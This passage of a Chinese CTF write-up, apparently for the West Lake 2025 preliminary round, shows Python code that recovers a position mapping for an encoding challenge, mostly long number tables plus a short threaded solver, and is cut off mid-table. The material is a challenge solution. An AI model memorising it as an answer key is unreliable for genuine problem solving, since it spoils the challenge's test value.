class="number">528</span>, <span class="number">238</span>: <span class="number">758</span>, <span class="number">239</span>: <span class="number">303</span>, <span class="number">242</span>: <span class="number">530</span>, <span class="number">243</span>: <span class="number">259</span>, <span class="number">244</span>: <span class="number">746</span>, <span class="number">245</span>: <span class="number">268</span>, <span class="number">246</span>: <span class="number">248</span>, <span class="number">247</span>: <span class="number">560</span>, <span class="number">250</span>: <span class="number">7</span>, <span class="number">251</span>: <span class="number">487</span>, <span class="number">252</span>: <span class="number">224</span>, <span class="number">253</span>: <span class="number">669</span>, <span class="number">254</span>: <span class="number">185</span>, <span class="number">255</span>: <span class="number">54</span>, <span class="number">258</span>: <span class="number">150</span>, <span class="number">259</span>: <span class="number">214</span>, <span class="number">260</span>: <span class="number">61</span>, <span class="number">261</span>: <span class="number">474</span>, <span class="number">262</span>: <span class="number">495</span>, <span class="number">263</span>: <span class="number">98</span>, <span class="number">266</span>: <span class="number">453</span>, <span class="number">267</span>: <span class="number">157</span>, <span class="number">268</span>: <span class="number">728</span>, <span class="number">269</span>: <span class="number">412</span>, <span class="number">270</span>: <span class="number">227</span>, <span class="number">271</span>: <span class="number">176</span>, <span class="number">274</span>: <span class="number">497</span>, <span class="number">275</span>: <span class="number">152</span>, <span class="number">276</span>: <span class="number">465</span>, <span class="number">277</span>: <span class="number">679</span>, <span class="number">278</span>: <span class="number">153</span>, <span class="number">279</span>: <span class="number">252</span>, <span class="number">282</span>: <span class="number">218</span>, <span class="number">283</span>: <span class="number">340</span>, <span class="number">284</span>: <span class="number">544</span>, <span class="number">285</span>: <span class="number">280</span>, <span class="number">286</span>: <span class="number">619</span>, <span class="number">287</span>: <span class="number">286</span>, <span class="number">290</span>: <span class="number">455</span>, <span class="number">291</span>: <span class="number">270</span>, <span class="number">292</span>: <span class="number">217</span>, <span class="number">293</span>: <span class="number">549</span>, <span class="number">294</span>: <span class="number">233</span>, <span class="number">295</span>: <span class="number">724</span>, <span class="number">298</span>: <span class="number">269</span>, <span class="number">299</span>: <span class="number">261</span>, <span class="number">300</span>: <span class="number">249</span>, <span class="number">301</span>: <span class="number">751</span>, <span class="number">302</span>: <span class="number">58</span>, <span class="number">303</span>: <span class="number">428</span>, <span class="number">306</span>: <span class="number">67</span>, <span class="number">307</span>: <span class="number">165</span>, <span class="number">308</span>: <span class="number">31</span>, <span class="number">309</span>: <span class="number">79</span>, <span class="number">310</span>: <span class="number">739</span>, <span class="number">311</span>: <span class="number">119</span>, <span class="number">314</span>: <span class="number">179</span>, <span class="number">315</span>: <span class="number">162</span>, <span class="number">316</span>: <span class="number">671</span>, <span class="number">317</span>: <span class="number">374</span>, <span class="number">318</span>: <span class="number">109</span>, <span class="number">319</span>: <span class="number">290</span>, <span class="number">322</span>: <span class="number">187</span>, <span class="number">323</span>: <span class="number">481</span>, <span class="number">324</span>: <span class="number">208</span>, <span class="number">325</span>: <span class="number">732</span>, <span class="number">326</span>: <span class="number">243</span>, <span class="number">327</span>: <span class="number">554</span>, <span class="number">330</span>: <span class="number">640</span>, <span class="number">331</span>: <span class="number">43</span>, <span class="number">332</span>: <span class="number">689</span>, <span class="number">333</span>: <span class="number">578</span>, <span class="number">334</span>: <span class="number">16</span>, <span class="number">335</span>: <span class="number">597</span>, <span class="number">338</span>: <span class="number">196</span>, <span class="number">339</span>: <span class="number">514</span>, <span class="number">340</span>: <span class="number">147</span>, <span class="number">341</span>: <span class="number">444</span>, <span class="number">342</span>: <span class="number">305</span>, <span class="number">343</span>: <span class="number">300</span>, <span class="number">346</span>: <span class="number">684</span>, <span class="number">347</span>: <span class="number">740</span>, <span class="number">348</span>: <span class="number">693</span>, <span class="number">349</span>: <span class="number">754</span>, <span class="number">350</span>: <span class="number">23</span>, <span class="number">351</span>: <span class="number">258</span>, <span class="number">354</span>: <span class="number">132</span>, <span class="number">355</span>: <span class="number">421</span>, <span class="number">356</span>: <span class="number">257</span>, <span class="number">357</span>: <span class="number">717</span>, <span class="number">358</span>: <span class="number">101</span>, <span class="number">359</span>: <span class="number">398</span>, <span class="number">362</span>: <span class="number">34</span>, <span class="number">363</span>: <span class="number">40</span>, <span class="number">364</span>: <span class="number">359</span>, <span class="number">365</span>: <span class="number">637</span>, <span class="number">366</span>: <span class="number">250</span>, <span class="number">367</span>: <span class="number">56</span>, <span class="number">370</span>: <span class="number">182</span>, <span class="number">371</span>: <span class="number">720</span>, <span class="number">372</span>: <span class="number">667</span>, <span class="number">373</span>: <span class="number">353</span>, <span class="number">374</span>: <span class="number">423</span>, <span class="number">375</span>: <span class="number">573</span>, <span class="number">378</span>: <span class="number">41</span>, <span class="number">379</span>: <span class="number">626</span>, <span class="number">380</span>: <span class="number">197</span>, <span class="number">381</span>: <span class="number">91</span>, <span class="number">382</span>: <span class="number">30</span>, <span class="number">383</span>: <span class="number">5</span>, <span class="number">386</span>: <span class="number">639</span>, <span class="number">387</span>: <span class="number">469</span>, <span class="number">388</span>: <span class="number">35</span>, <span class="number">389</span>: <span class="number">726</span>, <span class="number">390</span>: <span class="number">427</span>, <span class="number">391</span>: <span class="number">752</span>, <span class="number">394</span>: <span class="number">478</span>, <span class="number">395</span>: <span class="number">122</span>, <span class="number">396</span>: <span class="number">251</span>, <span class="number">397</span>: <span class="number">558</span>, <span class="number">398</span>: <span class="number">595</span>, <span class="number">399</span>: <span class="number">664</span>, <span class="number">402</span>: <span class="number">612</span>, <span class="number">403</span>: <span class="number">213</span>, <span class="number">404</span>: <span class="number">484</span>, <span class="number">405</span>: <span class="number">418</span>, <span class="number">406</span>: <span class="number">102</span>, <span class="number">407</span>: <span class="number">201</span>, <span class="number">410</span>: <span class="number">628</span>, <span class="number">411</span>: <span class="number">692</span>, <span class="number">412</span>: <span class="number">743</span>, <span class="number">413</span>: <span class="number">308</span>, <span class="number">414</span>: <span class="number">696</span>, <span class="number">415</span>: <span class="number">540</span>, <span class="number">418</span>: <span class="number">552</span>, <span class="number">419</span>: <span class="number">19</span>, <span class="number">420</span>: <span class="number">496</span>, <span class="number">421</span>: <span class="number">370</span>, <span class="number">422</span>: <span class="number">510</span>, <span class="number">423</span>: <span class="number">502</span>, <span class="number">426</span>: <span class="number">681</span>, <span class="number">427</span>: <span class="number">407</span>, <span class="number">428</span>: <span class="number">762</span>, <span class="number">429</span>: <span class="number">20</span>, <span class="number">430</span>: <span class="number">632</span>, <span class="number">431</span>: <span class="number">501</span>, <span class="number">434</span>: <span class="number">279</span>, <span class="number">435</span>: <span class="number">4</span>, <span class="number">436</span>: <span class="number">584</span>, <span class="number">437</span>: <span class="number">574</span>, <span class="number">438</span>: <span class="number">708</span>, <span class="number">439</span>: <span class="number">3</span>, <span class="number">442</span>: <span class="number">414</span>, <span class="number">443</span>: <span class="number">415</span>, <span class="number">444</span>: <span class="number">383</span>, <span class="number">445</span>: <span class="number">175</span>, <span class="number">446</span>: <span class="number">321</span>, <span class="number">447</span>: <span class="number">238</span>, <span class="number">450</span>: <span class="number">454</span>, <span class="number">451</span>: <span class="number">319</span>, <span class="number">452</span>: <span class="number">599</span>, <span class="number">453</span>: <span class="number">88</span>, <span class="number">454</span>: <span class="number">335</span>, <span class="number">455</span>: <span class="number">457</span>, <span class="number">458</span>: <span class="number">659</span>, <span class="number">459</span>: <span class="number">763</span>, <span class="number">460</span>: <span class="number">339</span>, <span class="number">461</span>: <span class="number">617</span>, <span class="number">462</span>: <span class="number">709</span>, <span class="number">463</span>: <span class="number">649</span>, <span class="number">466</span>: <span class="number">713</span>, <span class="number">467</span>: <span class="number">500</span>, <span class="number">468</span>: <span class="number">627</span>, <span class="number">469</span>: <span class="number">28</span>, <span class="number">470</span>: <span class="number">331</span>, <span class="number">471</span>: <span class="number">650</span>, <span class="number">474</span>: <span class="number">506</span>, <span class="number">475</span>: <span class="number">311</span>, <span class="number">476</span>: <span class="number">244</span>, <span class="number">477</span>: <span class="number">46</span>, <span class="number">478</span>: <span class="number">173</span>, <span class="number">479</span>: <span class="number">756</span>, <span class="number">482</span>: <span class="number">655</span>, <span class="number">483</span>: <span class="number">385</span>, <span class="number">484</span>: <span class="number">620</span>, <span class="number">485</span>: <span class="number">567</span>, <span class="number">486</span>: <span class="number">156</span>, <span class="number">487</span>: <span class="number">146</span>, <span class="number">490</span>: <span class="number">690</span>, <span class="number">491</span>: <span class="number">222</span>, <span class="number">492</span>: <span class="number">585</span>, <span class="number">493</span>: <span class="number">471</span>, <span class="number">494</span>: <span class="number">589</span>, <span class="number">495</span>: <span class="number">231</span>, <span class="number">498</span>: <span class="number">193</span>, <span class="number">499</span>: <span class="number">488</span>, <span class="number">500</span>: <span class="number">130</span>, <span class="number">501</span>: <span class="number">695</span>, <span class="number">502</span>: <span class="number">636</span>, <span class="number">503</span>: <span class="number">144</span>, <span class="number">506</span>: <span class="number">220</span>, <span class="number">507</span>: <span class="number">750</span>, <span class="number">508</span>: <span class="number">348</span>, <span class="number">509</span>: <span class="number">73</span>, <span class="number">510</span>: <span class="number">592</span>, <span class="number">511</span>: <span class="number">748</span>, <span class="number">514</span>: <span class="number">389</span>, <span class="number">515</span>: <span class="number">205</span>, <span class="number">516</span>: <span class="number">17</span>, <span class="number">517</span>: <span class="number">392</span>, <span class="number">518</span>: <span class="number">192</span>, <span class="number">519</span>: <span class="number">672</span>, <span class="number">522</span>: <span class="number">212</span>, <span class="number">523</span>: <span class="number">202</span>, <span class="number">524</span>: <span class="number">48</span>, <span class="number">525</span>: <span class="number">511</span>, <span class="number">526</span>: <span class="number">129</span>, <span class="number">527</span>: <span class="number">539</span>, <span class="number">530</span>: <span class="number">191</span>, <span class="number">531</span>: <span class="number">10</span>, <span class="number">532</span>: <span class="number">151</span>, <span class="number">533</span>: <span class="number">449</span>, <span class="number">534</span>: <span class="number">108</span>, <span class="number">535</span>: <span class="number">358</span>, <span class="number">538</span>: <span class="number">145</span>, <span class="number">539</span>: <span class="number">430</span>, <span class="number">540</span>: <span class="number">72</span>, <span class="number">541</span>: <span class="number">652</span>, <span class="number">542</span>: <span class="number">391</span>, <span class="number">543</span>: <span class="number">60</span>, <span class="number">546</span>: <span class="number">336</span>, <span class="number">547</span>: <span class="number">521</span>, <span class="number">548</span>: <span class="number">707</span>, <span class="number">549</span>: <span class="number">345</span>, <span class="number">550</span>: <span class="number">651</span>, <span class="number">551</span>: <span class="number">44</span>, <span class="number">554</span>: <span class="number">543</span>, <span class="number">555</span>: <span class="number">369</span>, <span class="number">556</span>: <span class="number">160</span>, <span class="number">557</span>: <span class="number">95</span>, <span class="number">558</span>: <span class="number">55</span>, <span class="number">559</span>: <span class="number">588</span>, <span class="number">562</span>: <span class="number">404</span>, <span class="number">563</span>: <span class="number">704</span>, <span class="number">564</span>: <span class="number">6</span>, <span class="number">565</span>: <span class="number">338</span>, <span class="number">566</span>: <span class="number">282</span>, <span class="number">567</span>: <span class="number">87</span>, <span class="number">570</span>: <span class="number">355</span>, <span class="number">571</span>: <span class="number">568</span>, <span class="number">572</span>: <span class="number">266</span>, <span class="number">573</span>: <span class="number">326</span>, <span class="number">574</span>: <span class="number">420</span>, <span class="number">575</span>: <span class="number">436</span>, <span class="number">578</span>: <span class="number">342</span>, <span class="number">579</span>: <span class="number">371</span>, <span class="number">580</span>: <span class="number">493</span>, <span class="number">581</span>: <span class="number">207</span>, <span class="number">582</span>: <span class="number">745</span>, <span class="number">583</span>: <span class="number">37</span>, <span class="number">586</span>: <span class="number">294</span>, <span class="number">587</span>: <span class="number">381</span>, <span class="number">588</span>: <span class="number">327</span>, <span class="number">589</span>: <span class="number">741</span>, <span class="number">590</span>: <span class="number">699</span>, <span class="number">591</span>: <span class="number">531</span>, <span class="number">594</span>: <span class="number">753</span>, <span class="number">595</span>: <span class="number">711</span>, <span class="number">596</span>: <span class="number">253</span>, <span class="number">597</span>: <span class="number">518</span>, <span class="number">598</span>: <span class="number">264</span>, <span class="number">599</span>: <span class="number">51</span>, <span class="number">602</span>: <span class="number">666</span>, <span class="number">603</span>: <span class="number">609</span>, <span class="number">604</span>: <span class="number">606</span>, <span class="number">605</span>: <span class="number">1</span>, <span class="number">606</span>: <span class="number">154</span>, <span class="number">607</span>: <span class="number">260</span>, <span class="number">610</span>: <span class="number">141</span>, <span class="number">611</span>: <span class="number">561</span>, <span class="number">612</span>: <span class="number">159</span>, <span class="number">613</span>: <span class="number">11</span>, <span class="number">614</span>: <span class="number">351</span>, <span class="number">615</span>: <span class="number">53</span>, <span class="number">618</span>: <span class="number">198</span>, <span class="number">619</span>: <span class="number">429</span>, <span class="number">620</span>: <span class="number">759</span>, <span class="number">621</span>: <span class="number">456</span>, <span class="number">622</span>: <span class="number">164</span>, <span class="number">623</span>: <span class="number">445</span>, <span class="number">626</span>: <span class="number">190</span>, <span class="number">627</span>: <span class="number">644</span>, <span class="number">628</span>: <span class="number">378</span>, <span class="number">629</span>: <span class="number">172</span>, <span class="number">630</span>: <span class="number">195</span>, <span class="number">631</span>: <span class="number">32</span>, <span class="number">634</span>: <span class="number">541</span>, <span class="number">635</span>: <span class="number">74</span>, <span class="number">636</span>: <span class="number">373</span>, <span class="number">637</span>: <span class="number">509</span>, <span class="number">638</span>: <span class="number">643</span>, <span class="number">639</span>: <span class="number">309</span>, <span class="number">642</span>: <span class="number">702</span>, <span class="number">643</span>: <span class="number">417</span>, <span class="number">644</span>: <span class="number">230</span>, <span class="number">645</span>: <span class="number">727</span>, <span class="number">646</span>: <span class="number">33</span>, <span class="number">647</span>: <span class="number">614</span>, <span class="number">650</span>: <span class="number">64</span>, <span class="number">651</span>: <span class="number">670</span>, <span class="number">652</span>: <span class="number">395</span>, <span class="number">653</span>: <span class="number">171</span>, <span class="number">654</span>: <span class="number">183</span>, <span class="number">655</span>: <span class="number">292</span>, <span class="number">658</span>: <span class="number">642</span>, <span class="number">659</span>: <span class="number">180</span>, <span class="number">660</span>: <span class="number">534</span>, <span class="number">661</span>: <span class="number">535</span>, <span class="number">662</span>: <span class="number">661</span>, <span class="number">663</span>: <span class="number">603</span>, <span class="number">666</span>: <span class="number">571</span>, <span class="number">667</span>: <span class="number">634</span>, <span class="number">668</span>: <span class="number">236</span>, <span class="number">669</span>: <span class="number">189</span>, <span class="number">670</span>: <span class="number">124</span>, <span class="number">671</span>: <span class="number">516</span>, <span class="number">674</span>: <span class="number">464</span>, <span class="number">675</span>: <span class="number">298</span>, <span class="number">676</span>: <span class="number">47</span>, <span class="number">677</span>: <span class="number">178</span>, <span class="number">678</span>: <span class="number">411</span>, <span class="number">679</span>: <span class="number">360</span>, <span class="number">682</span>: <span class="number">402</span>, <span class="number">683</span>: <span class="number">700</span>, <span class="number">684</span>: <span class="number">186</span>, <span class="number">685</span>: <span class="number">65</span>, <span class="number">686</span>: <span class="number">590</span>, <span class="number">687</span>: <span class="number">206</span>, <span class="number">690</span>: <span class="number">324</span>, <span class="number">691</span>: <span class="number">163</span>, <span class="number">692</span>: <span class="number">341</span>, <span class="number">693</span>: <span class="number">452</span>, <span class="number">694</span>: <span class="number">161</span>, <span class="number">695</span>: <span class="number">482</span>, <span class="number">698</span>: <span class="number">613</span>, <span class="number">699</span>: <span class="number">396</span>, <span class="number">700</span>: <span class="number">472</span>, <span class="number">701</span>: <span class="number">548</span>, <span class="number">702</span>: <span class="number">26</span>, <span class="number">703</span>: <span class="number">483</span>, <span class="number">706</span>: <span class="number">333</span>, <span class="number">707</span>: <span class="number">103</span>, <span class="number">708</span>: <span class="number">194</span>, <span class="number">709</span>: <span class="number">38</span>, <span class="number">710</span>: <span class="number">219</span>, <span class="number">711</span>: <span class="number">520</span>, <span class="number">714</span>: <span class="number">532</span>, <span class="number">715</span>: <span class="number">557</span>, <span class="number">716</span>: <span class="number">363</span>, <span class="number">717</span>: <span class="number">272</span>, <span class="number">718</span>: <span class="number">357</span>, <span class="number">719</span>: <span class="number">470</span>, <span class="number">722</span>: <span class="number">387</span>, <span class="number">723</span>: <span class="number">356</span>, <span class="number">724</span>: <span class="number">80</span>, <span class="number">725</span>: <span class="number">225</span>, <span class="number">726</span>: <span class="number">320</span>, <span class="number">727</span>: <span class="number">602</span>, <span class="number">730</span>: <span class="number">426</span>, <span class="number">731</span>: <span class="number">361</span>, <span class="number">732</span>: <span class="number">315</span>, <span class="number">733</span>: <span class="number">297</span>, <span class="number">734</span>: <span class="number">216</span>, <span class="number">735</span>: <span class="number">302</span>, <span class="number">738</span>: <span class="number">668</span>, <span class="number">739</span>: <span class="number">577</span>, <span class="number">740</span>: <span class="number">118</span>, <span class="number">741</span>: <span class="number">139</span>, <span class="number">742</span>: <span class="number">350</span>, <span class="number">743</span>: <span class="number">267</span>, <span class="number">746</span>: <span class="number">486</span>, <span class="number">747</span>: <span class="number">490</span>, <span class="number">748</span>: <span class="number">177</span>, <span class="number">749</span>: <span class="number">86</span>, <span class="number">750</span>: <span class="number">117</span>, <span class="number">751</span>: <span class="number">607</span>, <span class="number">754</span>: <span class="number">459</span>, <span class="number">755</span>: <span class="number">761</span>, <span class="number">756</span>: <span class="number">242</span>, <span class="number">757</span>: <span class="number">68</span>, <span class="number">758</span>: <span class="number">475</span>, <span class="number">759</span>: <span class="number">394</span>, <span class="number">762</span>: <span class="number">467</span>, <span class="number">763</span>: <span class="number">580</span>, <span class="number">764</span>: <span class="number">328</span>, <span class="number">765</span>: <span class="number">62</span>, <span class="number">766</span>: <span class="number">733</span>, <span class="number">767</span>: <span class="number">143</span>&#125;</span><br><span class="line">    send = <span class="string">&#x27;9&#x27;</span> * <span class="number">96</span></span><br><span class="line">    encode_base = get_encode_string(send)</span><br><span class="line"></span><br><span class="line">    chars_to_check = [<span class="string">&#x27;y&#x27;</span>]</span><br><span class="line">    tasks = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor() <span class="keyword">as</span> executor:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">96</span>):</span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> chars_to_check:</span><br><span class="line">                tasks.append(executor.submit(process_single_character, i, char, encode_base))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> task <span class="keyword">in</span> tasks:</span><br><span class="line">            key, value = task.result()</span><br><span class="line">            change_map[key] = value</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(change_map)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-West-Lake-2025-Preliminary-round-Writeup/202501181728853.png"></p>
<p>这回跑的很快，一下就出了，这就是最终的映射表<br>下面只需要提取出<code>Check in with</code>后面跟着的密文并根据这个映射关系还原回去即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">change_map = &#123;<span class="number">2</span>: <span class="number">523</span>, <span class="number">3</span>: <span class="number">100</span>, <span class="number">4</span>: <span class="number">295</span>, <span class="number">5</span>: <span class="number">435</span>, <span class="number">6</span>: <span class="number">168</span>, <span class="number">7</span>: <span class="number">199</span>, <span class="number">10</span>: <span class="number">310</span>, <span class="number">11</span>: <span class="number">744</span>, <span class="number">12</span>: <span class="number">127</span>, <span class="number">13</span>: <span class="number">254</span>, <span class="number">14</span>: <span class="number">623</span>, <span class="number">15</span>: <span class="number">221</span>, <span class="number">18</span>: <span class="number">625</span>, <span class="number">19</span>: <span class="number">316</span>, <span class="number">20</span>: <span class="number">731</span>, <span class="number">21</span>: <span class="number">635</span>, <span class="number">22</span>: <span class="number">718</span>, <span class="number">23</span>: <span class="number">229</span>, <span class="number">26</span>: <span class="number">438</span>, <span class="number">27</span>: <span class="number">12</span>, <span class="number">28</span>: <span class="number">99</span>, <span class="number">29</span>: <span class="number">503</span>, <span class="number">30</span>: <span class="number">136</span>, <span class="number">31</span>: <span class="number">204</span>, <span class="number">34</span>: <span class="number">241</span>, <span class="number">35</span>: <span class="number">526</span>, <span class="number">36</span>: <span class="number">621</span>, <span class="number">37</span>: <span class="number">450</span>, <span class="number">38</span>: <span class="number">491</span>, <span class="number">39</span>: <span class="number">24</span>, <span class="number">42</span>: <span class="number">734</span>, <span class="number">43</span>: <span class="number">125</span>, <span class="number">44</span>: <span class="number">719</span>, <span class="number">45</span>: <span class="number">406</span>, <span class="number">46</span>: <span class="number">209</span>, <span class="number">47</span>: <span class="number">458</span>, <span class="number">50</span>: <span class="number">519</span>, <span class="number">51</span>: <span class="number">263</span>, <span class="number">52</span>: <span class="number">504</span>, <span class="number">53</span>: <span class="number">403</span>, <span class="number">54</span>: <span class="number">22</span>, <span class="number">55</span>: <span class="number">142</span>, <span class="number">58</span>: <span class="number">400</span>, <span class="number">59</span>: <span class="number">274</span>, <span class="number">60</span>: <span class="number">547</span>, <span class="number">61</span>: <span class="number">657</span>, <span class="number">62</span>: <span class="number">611</span>, <span class="number">63</span>: <span class="number">107</span>, <span class="number">66</span>: <span class="number">559</span>, <span class="number">67</span>: <span class="number">697</span>, <span class="number">68</span>: <span class="number">228</span>, <span class="number">69</span>: <span class="number">660</span>, <span class="number">70</span>: <span class="number">545</span>, <span class="number">71</span>: <span class="number">757</span>, <span class="number">74</span>: <span class="number">477</span>, <span class="number">75</span>: <span class="number">665</span>, <span class="number">76</span>: <span class="number">307</span>, <span class="number">77</span>: <span class="number">448</span>, <span class="number">78</span>: <span class="number">662</span>, <span class="number">79</span>: <span class="number">566</span>, <span class="number">82</span>: <span class="number">466</span>, <span class="number">83</span>: <span class="number">462</span>, <span class="number">84</span>: <span class="number">645</span>, <span class="number">85</span>: <span class="number">451</span>, <span class="number">86</span>: <span class="number">215</span>, <span class="number">87</span>: <span class="number">317</span>, <span class="number">90</span>: <span class="number">285</span>, <span class="number">91</span>: <span class="number">716</span>, <span class="number">92</span>: <span class="number">601</span>, <span class="number">93</span>: <span class="number">106</span>, <span class="number">94</span>: <span class="number">646</span>, <span class="number">95</span>: <span class="number">712</span>, <span class="number">98</span>: <span class="number">126</span>, <span class="number">99</span>: <span class="number">232</span>, <span class="number">100</span>: <span class="number">380</span>, <span class="number">101</span>: <span class="number">622</span>, <span class="number">102</span>: <span class="number">364</span>, <span class="number">103</span>: <span class="number">677</span>, <span class="number">106</span>: <span class="number">405</span>, <span class="number">107</span>: <span class="number">641</span>, <span class="number">108</span>: <span class="number">460</span>, <span class="number">109</span>: <span class="number">654</span>, <span class="number">110</span>: <span class="number">203</span>, <span class="number">111</span>: <span class="number">84</span>, <span class="number">114</span>: <span class="number">537</span>, <span class="number">115</span>: <span class="number">683</span>, <span class="number">116</span>: <span class="number">674</span>, <span class="number">117</span>: <span class="number">492</span>, <span class="number">118</span>: <span class="number">498</span>, <span class="number">119</span>: <span class="number">372</span>, <span class="number">122</span>: <span class="number">546</span>, <span class="number">123</span>: <span class="number">167</span>, <span class="number">124</span>: <span class="number">256</span>, <span class="number">125</span>: <span class="number">50</span>, <span class="number">126</span>: <span class="number">760</span>, <span class="number">127</span>: <span class="number">386</span>, <span class="number">130</span>: <span class="number">515</span>, <span class="number">131</span>: <span class="number">181</span>, <span class="number">132</span>: <span class="number">570</span>, <span class="number">133</span>: <span class="number">284</span>, <span class="number">134</span>: <span class="number">721</span>, <span class="number">135</span>: <span class="number">587</span>, <span class="number">138</span>: <span class="number">246</span>, <span class="number">139</span>: <span class="number">581</span>, <span class="number">140</span>: <span class="number">379</span>, <span class="number">141</span>: <span class="number">346</span>, <span class="number">142</span>: <span class="number">123</span>, <span class="number">143</span>: <span class="number">722</span>, <span class="number">146</span>: <span class="number">725</span>, <span class="number">147</span>: <span class="number">694</span>, <span class="number">148</span>: <span class="number">767</span>, <span class="number">149</span>: <span class="number">499</span>, <span class="number">150</span>: <span class="number">440</span>, <span class="number">151</span>: <span class="number">447</span>, <span class="number">154</span>: <span class="number">705</span>, <span class="number">155</span>: <span class="number">575</span>, <span class="number">156</span>: <span class="number">425</span>, <span class="number">157</span>: <span class="number">608</span>, <span class="number">158</span>: <span class="number">583</span>, <span class="number">159</span>: <span class="number">512</span>, <span class="number">162</span>: <span class="number">755</span>, <span class="number">163</span>: <span class="number">663</span>, <span class="number">164</span>: <span class="number">507</span>, <span class="number">165</span>: <span class="number">399</span>, <span class="number">166</span>: <span class="number">698</span>, <span class="number">167</span>: <span class="number">337</span>, <span class="number">170</span>: <span class="number">624</span>, <span class="number">171</span>: <span class="number">382</span>, <span class="number">172</span>: <span class="number">648</span>, <span class="number">173</span>: <span class="number">299</span>, <span class="number">174</span>: <span class="number">439</span>, <span class="number">175</span>: <span class="number">329</span>, <span class="number">178</span>: <span class="number">29</span>, <span class="number">179</span>: <span class="number">210</span>, <span class="number">180</span>: <span class="number">538</span>, <span class="number">181</span>: <span class="number">140</span>, <span class="number">182</span>: <span class="number">673</span>, <span class="number">183</span>: <span class="number">388</span>, <span class="number">186</span>: <span class="number">738</span>, <span class="number">187</span>: <span class="number">113</span>, <span class="number">188</span>: <span class="number">314</span>, <span class="number">189</span>: <span class="number">325</span>, <span class="number">190</span>: <span class="number">69</span>, <span class="number">191</span>: <span class="number">112</span>, <span class="number">194</span>: <span class="number">555</span>, <span class="number">195</span>: <span class="number">289</span>, <span class="number">196</span>: <span class="number">432</span>, <span class="number">197</span>: <span class="number">656</span>, <span class="number">198</span>: <span class="number">765</span>, <span class="number">199</span>: <span class="number">81</span>, <span class="number">202</span>: <span class="number">149</span>, <span class="number">203</span>: <span class="number">111</span>, <span class="number">204</span>: <span class="number">85</span>, <span class="number">205</span>: <span class="number">610</span>, <span class="number">206</span>: <span class="number">170</span>, <span class="number">207</span>: <span class="number">586</span>, <span class="number">210</span>: <span class="number">390</span>, <span class="number">211</span>: <span class="number">710</span>, <span class="number">212</span>: <span class="number">281</span>, <span class="number">213</span>: <span class="number">630</span>, <span class="number">214</span>: <span class="number">480</span>, <span class="number">215</span>: <span class="number">419</span>, <span class="number">218</span>: <span class="number">352</span>, <span class="number">219</span>: <span class="number">476</span>, <span class="number">220</span>: <span class="number">293</span>, <span class="number">221</span>: <span class="number">527</span>, <span class="number">222</span>: <span class="number">593</span>, <span class="number">223</span>: <span class="number">0</span>, <span class="number">226</span>: <span class="number">375</span>, <span class="number">227</span>: <span class="number">8</span>, <span class="number">228</span>: <span class="number">133</span>, <span class="number">229</span>: <span class="number">166</span>, <span class="number">230</span>: <span class="number">83</span>, <span class="number">231</span>: <span class="number">354</span>, <span class="number">234</span>: <span class="number">344</span>, <span class="number">235</span>: <span class="number">313</span>, <span class="number">236</span>: <span class="number">334</span>, <span class="number">237</span>: <span class="number">528</span>, <span class="number">238</span>: <span class="number">758</span>, <span class="number">239</span>: <span class="number">303</span>, <span class="number">242</span>: <span class="number">530</span>, <span class="number">243</span>: <span class="number">259</span>, <span class="number">244</span>: <span class="number">746</span>, <span class="number">245</span>: <span class="number">268</span>, <span class="number">246</span>: <span class="number">248</span>, <span class="number">247</span>: <span class="number">560</span>, <span class="number">250</span>: <span class="number">7</span>, <span class="number">251</span>: <span class="number">487</span>, <span class="number">252</span>: <span class="number">224</span>, <span class="number">253</span>: <span class="number">669</span>, <span class="number">254</span>: <span class="number">185</span>, <span class="number">255</span>: <span class="number">54</span>, <span class="number">258</span>: <span class="number">150</span>, <span class="number">259</span>: <span class="number">214</span>, <span class="number">260</span>: <span class="number">61</span>, <span class="number">261</span>: <span class="number">474</span>, <span class="number">262</span>: <span class="number">495</span>, <span class="number">263</span>: <span class="number">98</span>, <span class="number">266</span>: <span class="number">453</span>, <span class="number">267</span>: <span class="number">157</span>, <span class="number">268</span>: <span class="number">728</span>, <span class="number">269</span>: <span class="number">412</span>, <span class="number">270</span>: <span class="number">227</span>, <span class="number">271</span>: <span class="number">176</span>, <span class="number">274</span>: <span class="number">497</span>, <span class="number">275</span>: <span class="number">152</span>, <span class="number">276</span>: <span class="number">465</span>, <span class="number">277</span>: <span class="number">679</span>, <span class="number">278</span>: <span class="number">153</span>, <span class="number">279</span>: <span class="number">252</span>, <span class="number">282</span>: <span class="number">218</span>, <span class="number">283</span>: <span class="number">340</span>, <span class="number">284</span>: <span class="number">544</span>, <span class="number">285</span>: <span class="number">280</span>, <span class="number">286</span>: <span class="number">619</span>, <span class="number">287</span>: <span class="number">286</span>, <span class="number">290</span>: <span class="number">455</span>, <span class="number">291</span>: <span class="number">270</span>, <span class="number">292</span>: <span class="number">217</span>, <span class="number">293</span>: <span class="number">549</span>, <span class="number">294</span>: <span class="number">233</span>, <span class="number">295</span>: <span class="number">724</span>, <span class="number">298</span>: <span class="number">269</span>, <span class="number">299</span>: <span class="number">261</span>, <span class="number">300</span>: <span class="number">249</span>, <span class="number">301</span>: <span class="number">751</span>, <span class="number">302</span>: <span class="number">58</span>, <span class="number">303</span>: <span class="number">428</span>, <span class="number">306</span>: <span class="number">67</span>, <span class="number">307</span>: <span class="number">165</span>, <span class="number">308</span>: <span class="number">31</span>, <span class="number">309</span>: <span class="number">79</span>, <span class="number">310</span>: <span class="number">739</span>, <span class="number">311</span>: <span class="number">119</span>, <span class="number">314</span>: <span class="number">179</span>, <span class="number">315</span>: <span class="number">162</span>, <span class="number">316</span>: <span class="number">671</span>, <span class="number">317</span>: <span class="number">374</span>, <span class="number">318</span>: <span class="number">109</span>, <span class="number">319</span>: <span class="number">290</span>, <span 